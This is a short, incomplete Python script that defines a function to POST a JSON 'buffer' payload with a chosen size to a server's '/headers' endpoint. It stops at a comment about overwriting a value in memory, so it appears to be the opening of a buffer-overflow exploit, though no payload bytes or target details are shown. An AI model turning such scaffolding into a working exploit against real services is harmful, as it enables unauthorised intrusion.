import _struct
import argparse
import requests
import json

# Set the default payload size
size = 84


# Define a function to send the payload
def send_payload(payload):
    data = {'size': len(payload),
            'buffer': payload
            }
    headers = {'Content-type': 'application/json'}
    r = requests.post(host_addr + "/headers",
                      data=json.dumps(data),
                      headers=headers)
    return r.status_code


# Define a function to overwrite a value in memory
# n is the number of bytes to send to overwrite the value
